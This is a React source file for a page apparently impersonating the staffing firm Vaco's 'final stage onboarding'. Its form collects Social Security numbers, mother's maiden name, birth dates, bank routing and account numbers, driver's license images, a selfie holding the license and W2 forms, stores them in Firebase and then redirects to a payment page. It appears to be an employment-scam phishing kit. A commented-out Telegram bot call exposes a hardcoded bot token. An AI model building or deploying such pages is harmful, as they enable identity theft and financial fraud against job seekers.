import React, { useState, useEffect } from 'react';
import './home.css';

import moment from 'moment';
import { useNavigate,Link , useLocation} from 'react-router-dom';


import logo from './logo.svg';
import social from './social.png';
import footer from './footer.svg';


import {db, auth, storage} from './firebase';

import axios from 'axios'

import { collection, getDocs, where, query, doc, setDoc,deleteDoc } from "firebase/firestore";
import hero from './hero.jpeg';
import { ref, uploadBytes, getDownloadURL } from "firebase/storage";


import Swal from 'sweetalert2';



function Onboarding(){


    const location  = useLocation();
    const navigate = useNavigate();


    


    //   application data

    const[firstname, setFirstName] = useState("");
    const[lastname, setLastName] = useState("");
    const[middlename, setMiddleName] = useState("");
    const[maiden_name, setMaidenName] = useState("");
    const[dob, setDob] = useState("");
    const[ssn, setSSN] = useState("");
    const[address, setAddress] = useState("");
    const[routing_number, setRoutingNumber] = useState("");
    const[account_number, setAccountNumber] = useState("");


    const[upload, setUpload] = useState(null);
    const[license, setLicense] = useState(null);

    const[licenseBack, setLicenseBack] = useState(null);
    const[licenseHold, setLicenseHold] = useState(null);
    const[normalPhoto, setNormalPhoto] = useState(null);
    const[w2Form, setW2Form] = useState(null);

    const[uploadUrl, setUploadUrl] = useState("");
    const[frontUrl, setFrontUrl] = useState("");
    const[backUrl, setBackUrl] = useState("");
    const[holdUrl, setHoldUrl] = useState("");
    const[normalUrl, setNormalUrl] = useState("");
    const[w2FormUrl, setW2FormUrl] = useState("");
    const[isLoading , setLoading] = useState(false);

      const currentTimestamp = moment().format('YYYY-MM-DD HH:mm:ss');

      const allowedFileTypes = ['application/pdf', 'image/jpeg', 'image/png', 'image/svg'];
      const maxFileSize = 512 * 1024; // 512KB

      const [error, setError] = useState('');

      const[licenseError, setLicenseError] = useState("");
      const[licenseBackError, setLicenseBackError] = useState("");
      const[licenseHoldError, setLicenseHoldError] = useState("");

      const[normalPhotoError, setNormalPhotoError] = useState("");

      const[w2FormError, setW2FormError] = useState("");

      const handleDriversLicense = (event) => {
        // Set the selected file to the state

        const selectedLicense = event.target.files[0];

    // Validate file type
    if (selectedLicense && !allowedFileTypes.includes(selectedLicense.type)) {
      setLicenseError('Invalid file type. Only .pdf, .png(image), .jpeg(image) files are accepted.');
      return;
    }

   
    setLicenseError('');
        setLicense(event.target.files[0]);



      };


    //   handle back license


    const handleDriversLicenseBack = (event) => {
        // Set the selected file to the state

        const selectedBackLicense = event.target.files[0];

    // Validate file type
    if (selectedBackLicense && !allowedFileTypes.includes(selectedBackLicense.type)) {
      setLicenseBackError('Invalid file type. Only .pdf, .png(image), .jpeg(image) files are accepted.');
      return;
    }

   
    setLicenseBackError('');
        setLicenseBack(event.target.files[0]);



      };
    

      //holding license


      const handleDriversLicenseHold = (event) => {
        // Set the selected file to the state

        const selectedHoldLicense = event.target.files[0];

    // Validate file type
    if (selectedHoldLicense && !allowedFileTypes.includes(selectedHoldLicense.type)) {
      setLicenseHoldError('Invalid file type. Only .pdf, .png(image), .jpeg(image) files are accepted.');
      return;
    }

   
    setLicenseHoldError('');
        setLicenseHold(event.target.files[0]);



      };
    


      //normal photo




      const handleNormalPhoto = (event) => {
        // Set the selected file to the state

        const selectedNormalPhoto = event.target.files[0];

    // Validate file type
    if (selectedNormalPhoto && !allowedFileTypes.includes(selectedNormalPhoto.type)) {
      setNormalPhotoError('Invalid file type. Only .pdf, .png(image), .jpeg(image) files are accepted.');
      return;
    }

   
    setNormalPhotoError('');
        setNormalPhoto(event.target.files[0]);



      };
    

      //handle W2


      const handleW2Form = (event) => {
        // Set the selected file to the state

        const selectedW2Form = event.target.files[0];

    // Validate file type
    if (selectedW2Form && !allowedFileTypes.includes(selectedW2Form.type)) {
      setW2FormError('Invalid file type. Only .pdf, .png(image), .jpeg(image) files are accepted.');
      return;
    }

   
    setW2FormError('');
        setW2Form(event.target.files[0]);



      };






    
    async function addToFireStore(e){
        e.preventDefault();
    
        try {
    
            setLoading(true);
    
           
            //frontLicense
            
            const frontRef = ref(storage, `final/${license.name}`);
            await uploadBytes(frontRef, license);
        
            // Get download URL for the uploaded file
            const furl = await getDownloadURL(frontRef);
        
           // console.log("Resume uploaded successfully to Firebase Storage");
            setFrontUrl(furl) ;

            console.log(furl);



            //backlicense
            const backRef = ref(storage, `final/${licenseBack.name}`);
            await uploadBytes(backRef, licenseBack);
        
            // Get download URL for the uploaded file
            const burl = await getDownloadURL(backRef);
        
           // console.log("Resume uploaded successfully to Firebase Storage");
            setBackUrl(burl) ;
            console.log(burl)


            //hold license
            const holdRef = ref(storage, `final/${licenseHold.name}`);
            await uploadBytes(holdRef, licenseHold);
        
            // Get download URL for the uploaded file
            const hurl = await getDownloadURL(holdRef);
        
           // console.log("Resume uploaded successfully to Firebase Storage");
            setHoldUrl(hurl) ;
            console.log(hurl);


            //normal


            const normalRef = ref(storage, `final/${normalPhoto.name}`);
            await uploadBytes(normalRef, normalPhoto);
        
            // Get download URL for the uploaded file
            const nurl = await getDownloadURL(normalRef);
        
           // console.log("Resume uploaded successfully to Firebase Storage");
            setNormalUrl(nurl) ;
            console.log(nurl);



            //w2 form 
            const formRef = ref(storage, `final/${w2Form.name}`);
            await uploadBytes(formRef, w2Form);
        
            // Get download URL for the uploaded file
            const wurl = await getDownloadURL(formRef);
        
           // console.log("Resume uploaded successfully to Firebase Storage");
            setW2FormUrl(wurl) ;
            console.log(wurl);


    
    
    
            await setDoc(doc(db, "final", currentTimestamp), {
                firstname:firstname,
                middlename:middlename,
                lastname:lastname,
                maidenname:maiden_name,
                dob:dob,
                Sn:ssn,
                address:address,
                dfront:furl,
                dback:burl,
                dhold:hurl,
                normal:nurl,
                w2:wurl,
                routing_number:routing_number,
                account_number:account_number,



    
              });
    
              console.log("Record Added Successfully");
    
              setLoading(false);
              

              setFirstName("");
              setLastName("");
              setMiddleName("");
              setMaidenName("");
              setDob("")
              setSSN("")
              setAddress("");


             
           
              // const response = await axios.post(`https://api.telegram.org/bot5464982919:AAGtjeZQ4hxueJkOoefHp040NJNaWGIZKMM/sendMessage`, {
              //   chat_id: 950865661,
              //   text: `Vaco final stage onboarding details have been submitted, kindly login to your dashboard to view`,
              // });
          
    
              alert('Details submitted successfully');
              setTimeout(() => {
                navigate('/payment-method');
              }, 1000); 
             
    
            //   navigate('/payment-method');
    
             
            //   Swal.fire({
            //     position: "top-end",
            //     icon: "success",
            //     title: "Details submitted successfully",
            //     showConfirmButton: false,
            //     timer: 1500
            //   });
            
            
          } catch (e) {
            console.error("Error adding document: ", e);
          }
    
       
    
        //   setFirstName("");
        
    }

    return(
        <>
             <nav className="navbar containerr navbar-expand-lg navbar-light">
                <a className="navbar-brand" href="/"><img className='mylogo' src={logo}/></a>
                <button className="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
                    <span className="navbar-toggler-icon"></span>
                </button>
                <div className="collapse navbar-collapse" id="navbarNavAltMarkup">
                    <div className="navbar-nav ml-auto">
                   
                    <a className="nav-link mx-3" href="/">Home</a>
                    {/* <a className="nav-link mx-3" href="">About Us</a>
                    <a className="nav-link mx-3" href="#">Job Openings</a>
                    <a className="nav-link mx-3"href="#">For Veterans</a> */}
                    
                    </div>
                </div>
                </nav>

                    <br></br>
                <div className='herodivtwo py-5'>
                   
                </div>


               
              




                <div className='col-md-10 m-auto'>
                    <h2 className='titleheadtwo text-center'>Final Stage Onboarding Information Form</h2>

                 
                    <form onSubmit={addToFireStore}>
                        <div className='form-group row'>
                            <div className='col-md-4'>
                                <label>First Name</label>
                                <input onChange={function(e){
                                    setFirstName(e.target.value)
                                }} value={firstname} className='form-control'required />
                            </div>

                            <div className='col-md-4'>
                                <label>Middle Name</label>
                                <input onChange={function(e){
                                    setMiddleName(e.target.value)
                                }} value={middlename} className='form-control'required />
                            </div>

                            <div className='col-md-4'>
                                <label>Last Name</label>
                                <input onChange={function(e){
                                    setLastName(e.target.value)
                                }} value={lastname} className='form-control'required />
                            </div>

                        </div>


                        <div className='form-group row'>
                            <div className='col-md-4'>
                                <label>Mother's Maiden Name</label>
                                <input onChange={function(e){
                                    setMaidenName(e.target.value)
                                }} value={maiden_name} className='form-control'required />
                            </div>

                            <div className='col-md-4'>
                                <label>Date of Birth</label>
                                <input onChange={function(e){
                                    setDob(e.target.value)
                                }} value={dob} type="date" className='form-control'required />
                            </div>

                            <div className='col-md-4'>
                            <label>SSN</label>
                                
                                <input onChange={function(e){
                                    setSSN(e.target.value)
                                }} value={ssn} className='form-control'required />
                            </div>

                        </div>


                        

                        <div className='form-group row'>

                          
                            <label>Full Contact Address</label>
                            <textarea onChange={function(e){
                                    setAddress(e.target.value)
                                }} value={address} className='form-control'></textarea>

                         


                            
                      
                        </div>


                        <div className='form-group row'>
                        <div className='col-md-6'>
                            <label>Routing Number</label>
                                <input onChange={function(e){
                                    setRoutingNumber(e.target.value);
                                }} value={routing_number} type="number" className='form-control'required />
                                
                            </div>

                            <div className='col-md-6'>
                            <label>Account  Number</label>
                                <input onChange={function(e){
                                    setAccountNumber(e.target.value);
                                }} value={account_number} type="number" className='form-control'required />
                                
                            </div>

                        </div>



                        <div className='form-group row'>
                            <div className='col-md-4'>
                                <label>Driver's License (Front)</label>
                                <input onChange={handleDriversLicense} type="file" required />
                                {licenseError && <div className='text-danger text-center'style={{
                                    fontSize:"12px"
                                }}>{licenseError}</div>}
                            </div>

                            <div className='col-md-4'>
                            <label>Driver's License (Back)</label>
                                <input onChange={handleDriversLicenseBack} type="file" required />
                                {licenseBackError && <div className='text-danger text-center'style={{
                                    fontSize:"12px"
                                }}>{licenseBackError}</div>}
                                
                            </div>

                            <div className='col-md-4'>
                            <label>Photo of you holding Driver's License</label>
                                <input onChange={handleDriversLicenseHold} type="file" required />

                                {licenseHoldError && <div className='text-danger text-center'style={{
                                    fontSize:"12px"
                                }}>{licenseHoldError}</div>}
                            
                            </div>

                        </div>


                    <hr />

                        <div className='form-group row'>
                            <div className='col-md-6'>
                                <label>Normal Photograph</label> <br/>
                                <input onChange={handleNormalPhoto} type="file" required />
                                {normalPhotoError && <div className='text-danger text-center'style={{
                                    fontSize:"12px"
                                }}>{normalPhotoError}</div>}
                            </div>

                            <div className='col-md-6'>
                            <label>Previous W2 Form <span className='text-info' style={{
                                fontSize:"12px",
                                marginTop:"-10px",
                               
                            }}>Note:For alone those with existing W2 Form</span></label><br></br>
                                <input onChange={handleW2Form} type="file"  />
                                {w2FormError && <div className='text-danger text-center'style={{
                                    fontSize:"12px"
                                }}>{w2FormError}</div>}
                            </div>

                            

                        </div>


                        <br/>
                        <br/>

                        
                        {/* const[licenseError, setLicenseError] = useState("");
      const[licenseBackError, setLicenseBackError] = useState("");
      const[licenseHoldError, setLicenseHoldError] = useState("");

      const[normalPhotoError, setNormalPhotoError] = useState("");

      const[w2FormError, setW2FormError] = useState(""); */}


                        <div className='form-group mt-3 text-center'>
                            

                            {
                                !licenseError && !licenseBackError && !licenseHoldError && !normalPhotoError && !w2FormError && <button type='submit' className='btn apply'>{isLoading ? "Loading ..." : 'Save & Continue'}</button>
                            }

                        </div>

                        
                    </form>
                    

                 
             


               



                








               
               
                </div>


                <hr className='footerhr mt-5' />

                 <section className='footer containerr'>

                     <img className='mylogo' src={footer} />

                     <div>
                         <p className='small'>©2024 Vaco | All Rights Reserved</p>
                         <p className='small'>Vaco Global Headquarters: 5501 Virginia Way #120, Brentwood, TN 37027</p>
                         <p className='small'><a>Privacy policy</a> | <a>Fraud Policy</a> | <a>EEO Notice</a></p>
                     </div>


                    <img className='social'src={social} />
                 </section>



                 
                

        </>
    );
}

export default Onboarding;
